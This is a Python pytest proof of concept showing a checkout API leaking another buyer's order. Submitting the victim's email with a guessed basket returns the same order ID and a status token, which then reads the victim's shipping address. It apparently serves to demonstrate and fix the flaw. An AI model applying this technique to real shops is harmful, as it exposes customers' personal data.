"""Temporary PoC: cross-buyer order disclosure via unscoped idempotency key."""
from __future__ import annotations

import pytest

from tests.conftest import checkout_payload

pytestmark = pytest.mark.anyio


async def test_poc_attacker_recovers_victim_order_and_token(client, products):
    # Victim checks out normally (storefront sends no Idempotency-Key header).
    victim = await client.post(
        "/api/checkout/sessions",
        json=checkout_payload(
            email="victim@example.com",
            customer_name="Victim Person",
            items=[{"sku": "COF-ETH-250", "quantity": 1}],
            shipping_address={
                "line1": "9 Secret Lane",
                "city": "Privatetown",
                "postal_code": "99999",
                "country": "GB",
            },
        ),
    )
    assert victim.status_code == 201, victim.text
    victim_body = victim.json()

    # Attacker knows only the victim's email and guesses the basket.
    attacker = await client.post(
        "/api/checkout/sessions",
        json=checkout_payload(
            email="victim@example.com",
            customer_name="Mallory",
            items=[{"sku": "COF-ETH-250", "quantity": 1}],
            shipping_address={
                "line1": "1 Attacker Road",
                "city": "Elsewhere",
                "postal_code": "00000",
                "country": "US",
            },
        ),
    )
    assert attacker.status_code == 201, attacker.text
    attacker_body = attacker.json()

    print("\nVICTIM   order_id:", victim_body["order_id"])
    print("ATTACKER order_id:", attacker_body["order_id"])
    print("ATTACKER order_status_url:", attacker_body["order_status_url"])
    assert attacker_body["order_id"] == victim_body["order_id"]

    # And the leaked token reads the victim's full order.
    url = attacker_body["order_status_url"].replace("http://testserver", "")
    r = await client.get(url)
    print("LEAKED ORDER:", r.status_code, r.json())
    assert r.status_code == 200
    assert r.json()["shipping_address"]["line1"] == "9 Secret Lane"
